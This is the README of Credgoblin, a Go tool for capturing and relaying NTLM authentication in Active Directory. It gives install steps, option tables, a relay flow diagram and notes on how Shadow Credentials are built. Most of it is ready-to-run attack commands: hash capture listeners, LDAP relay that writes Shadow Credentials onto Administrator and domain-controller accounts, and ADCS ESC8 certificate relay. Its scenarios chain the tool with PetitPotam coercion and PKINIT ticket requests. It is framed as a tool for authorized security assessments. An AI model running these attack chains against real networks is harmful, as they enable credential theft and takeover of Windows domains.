<p align="center">
  <img src="assets/credgoblin-logo.png" alt="Credgoblin Logo" width="350">
</p>

<h1 align="center">Credgoblin</h1>

<p align="center">
  <strong>NTLM Hash Capture &amp; Relay Tool</strong><br>
  <em>A Go-based credential interception toolkit for Active Directory security assessments</em>
</p>

<p align="center">
  <a href="#features">Features</a> •
  <a href="#installation">Installation</a> •
  <a href="#usage">Usage</a> •
  <a href="#attack-scenarios">Attack Scenarios</a> •
  <a href="#technical-details">Technical Details</a>
</p>

---

## Overview

Credgoblin is a high-performance NTLM credential capture and relay tool written in Go. It provides security professionals with the ability to:

- **Capture** NTLMv2 hashes from SMB, HTTP, and HTTPS connections
- **Relay** NTLM authentication to LDAP for Shadow Credentials attacks
- **Relay** to AD Certificate Services (ADCS) for ESC8 certificate abuse
- **Export** credentials in formats compatible with Hashcat and PKINITtools

## Features

| Category | Feature | Description |
|----------|---------|-------------|
| **Capture** | Multi-Protocol Listener | SMB (445), HTTP (80), HTTPS (443) |
| **Capture** | Hashcat Output | NTLMv2 hashes in `-m 5600` format |
| **Relay** | LDAP/LDAPS | Shadow Credentials via `msDS-KeyCredentialLink` |
| **Relay** | ADCS (ESC8) | Certificate enrollment via web interface |
| **Relay** | Cross-Protocol | SMB→LDAP, SMB→HTTP, HTTP→LDAP |
| **Protocol** | SMB Support | SMB1 and SMB2 negotiation |
| **Protocol** | NTLM Support | Full Type 1/2/3 message handling |
| **Attack** | CVE-2019-1040 | Drop the MIC implementation |

## Installation

### From Source

```bash
git clone https://github.com/ineffectivecoder/credgoblin.git
cd credgoblin
go build -o credgoblin ./cmd/credgoblin
```

### Requirements

- **Go**: 1.21 or higher
- **Privileges**: Root/Administrator (required for binding to ports 80, 443, 445)
- **Platform**: Linux, macOS, Windows

## Usage

### Hash Capture Mode

Capture NTLMv2 hashes from incoming connections. Hashes are written in Hashcat `-m 5600` compatible format.

```bash
# Listen on all protocols (SMB + HTTP + HTTPS)
sudo ./credgoblin capture -i 0.0.0.0

# SMB only (port 445)
sudo ./credgoblin capture -i 0.0.0.0 -p 445

# HTTP/HTTPS only
sudo ./credgoblin capture -i 0.0.0.0 -p 80,443

# Custom output file with verbose logging
sudo ./credgoblin capture -i 0.0.0.0 -o captured_hashes.txt -v
```

**Capture Options:**

| Flag | Long | Default | Description |
|------|------|---------|-------------|
| `-i` | `--interface` | `0.0.0.0` | Listen address |
| `-p` | `--ports` | `both` | Ports: `80`, `443`, `445`, `both`, or comma-separated |
| `-o` | `--output` | `hashes.txt` | Output file for captured hashes |
| `-s` | `--server` | `CREDGOBLIN` | Server name to advertise |
| `-d` | `--domain` | `WORKGROUP` | Domain name to advertise |
| `-v` | `--verbose` | `false` | Enable verbose output |

### LDAP Relay Mode (Shadow Credentials)

Relay NTLM authentication to LDAP/LDAPS and inject Shadow Credentials for PKINIT-based authentication.

```bash
# Relay to LDAP
sudo ./credgoblin relay -t ldap://dc.domain.local \
    -u 'CN=TargetUser,CN=Users,DC=domain,DC=local'

# Relay to LDAPS (encrypted)
sudo ./credgoblin relay -t ldaps://dc.domain.local \
    -u 'CN=TargetComputer,CN=Computers,DC=domain,DC=local'

# Custom PFX output with password
sudo ./credgoblin relay -t ldap://dc.domain.local \
    -u 'CN=Administrator,CN=Users,DC=domain,DC=local' \
    -o admin.pfx -P 'SecurePassword123'
```

### ADCS Relay Mode (ESC8)

Relay to Active Directory Certificate Services web enrollment for certificate-based attacks.

```bash
# Relay to ADCS HTTP
sudo ./credgoblin relay -m adcs \
    -t http://ca.domain.local/certsrv \
    -T User

# Relay to ADCS HTTPS
sudo ./credgoblin relay -m adcs \
    -t https://ca.domain.local/certsrv \
    -T Machine

# HTTP listener only
sudo ./credgoblin relay -m adcs \
    -t http://ca.domain.local/certsrv \
    -T User -p 80
```

**Relay Options:**

| Flag | Long | Default | Description |
|------|------|---------|-------------|
| `-t` | `--target` | *required* | Target URL (`ldap://`, `ldaps://`, `http://`, `https://`) |
| `-m` | `--mode` | `ldap` | Relay mode: `ldap` or `adcs` |
| `-u` | `--target-user` | *required for LDAP* | Target user/computer DN |
| `-T` | `--template` | *required for ADCS* | Certificate template name |
| `-o` | `--output` | `<username>.pfx` | Output PFX path |
| `-P` | `--pfx-pass` | *random* | PFX password |
| `-p` | `--ports` | `both` | Listen ports: `80`, `445`, or `both` |
| `-v` | `--verbose` | `false` | Enable verbose output |

## Attack Scenarios

### Scenario 1: Shadow Credentials via Authentication Coercion

Leverage authentication coercion (e.g., PetitPotam) to relay credentials and inject Shadow Credentials.

```bash
# Terminal 1: Start relay server
sudo ./credgoblin relay -t ldap://dc.corp.local \
    -u 'CN=DC01,CN=Computers,DC=corp,DC=local'

# Terminal 2: Coerce authentication from target
python3 PetitPotam.py 10.10.10.50 10.10.10.10

# Terminal 1: Use the resulting PFX for authentication
python3 gettgtpkinit.py -cert-pfx DC01.pfx \
    -pfx-pass 'GeneratedPassword' corp.local/DC01$
```

### Scenario 2: ESC8 - ADCS HTTP Relay

Abuse misconfigured ADCS web enrollment to obtain certificates.

```bash
# Terminal 1: Start ADCS relay
sudo ./credgoblin relay -m adcs \
    -t http://ca.corp.local/certsrv -T User

# Terminal 2: Coerce domain controller authentication
python3 PetitPotam.py 10.10.10.50 10.10.10.10

# Terminal 1: Use DC certificate for authentication
python3 gettgtpkinit.py -cert-pfx DC01_.pfx \
    -pfx-pass 'GeneratedPassword' corp.local/DC01$
```

### Scenario 3: WebDAV Hash Capture

Capture credentials via WebClient service coercion.

```bash
# Start HTTPS listener (WebClient requires HTTPS or localhost)
sudo ./credgoblin capture -i 0.0.0.0 -p 443

# Coerce WebDAV authentication
python3 PetitPotam.py 10.10.10.50@80/test 10.10.10.10
```

## Technical Details

### NTLM Relay Flow

```
 Victim              Credgoblin              Target
   │                     │                     │
   │── SMB Negotiate ───>│                     │
   │<── SMB Response ────│                     │
   │── NTLM Type 1 ─────>│── NTLM Type 1 ─────>│
   │                     │<── NTLM Type 2 ─────│
   │<── NTLM Type 2 ─────│                     │
   │── NTLM Type 3 ─────>│── NTLM Type 3 ─────>│
   │                     │<── Auth Success ────│
   │                     │── Execute Attack ──>│
   │<── Auth Response ───│                     │
```

### LDAP SICILY Authentication

Credgoblin uses SICILY (Security Integrated Connection over LDAP with Yielding) for LDAP relay:

1. **Discovery Bind** (Tag 9): Enumerate supported authentication mechanisms
2. **Negotiate Bind** (Tag 10): Forward NTLM Type 1 message
3. **Response Bind** (Tag 11): Forward NTLM Type 3 message

### Shadow Credentials Implementation

The `msDS-KeyCredentialLink` attribute contains:

- **RSA 2048-bit Public Key**: In BCRYPT_RSAKEY_BLOB format
- **Device ID**: Unique identifier (UUID)
- **Key ID**: SHA256 hash of the public key
- **Timestamps**: Creation and last logon times
- **Key Hash**: SHA256 integrity hash

Generated PFX certificates include a UPN (User Principal Name) SAN extension for PKINIT compatibility.

### Hash Output Format

Captured hashes use Hashcat NTLMv2 format (`-m 5600`):

```
username::DOMAIN:ServerChallenge:NTProofStr:NTLMv2Response
```

## Limitations

| Limitation | Description |
|------------|-------------|
| **SMB Signing** | Targets with required SMB signing will reject relay attacks |
| **LDAP Signing** | Domain controllers requiring LDAP signing may block relay |
| **EPA/Channel Binding** | Windows Server 2025 enforces EPA by default, blocking LDAP relay |
| **Certificate Templates** | ADCS relay requires enrollment-enabled certificate templates |

## Dependencies

- [go-ldap/ldap](https://github.com/go-ldap/ldap) - LDAP client library
- [Azure/go-ntlmssp](https://github.com/Azure/go-ntlmssp) - NTLM authentication support
- [google/uuid](https://github.com/google/uuid) - UUID generation
- [go-pkcs12](https://pkg.go.dev/software.sslmate.com/src/go-pkcs12) - PFX/PKCS#12 export

## Credits

Credgoblin draws inspiration and techniques from:

- [Impacket](https://github.com/fortra/impacket) - ntlmrelayx reference implementation
- [Responder](https://github.com/lgandx/Responder) - Hash capture techniques
- [PKINITtools](https://github.com/dirkjanm/PKINITtools) - PKINIT authentication tools
- [Certipy](https://github.com/ly4k/Certipy) - ADCS attack research

## License

MIT License - See [LICENSE](LICENSE) for details.

## Disclaimer

**This tool is intended for authorized security testing and research purposes only.**

- Obtain proper written authorization before using this tool
- Ensure compliance with all applicable laws and regulations
- The authors are not responsible for misuse or damage caused by this tool

---

<p align="center">
  <em>Built for security professionals, by security professionals.</em>
</p>
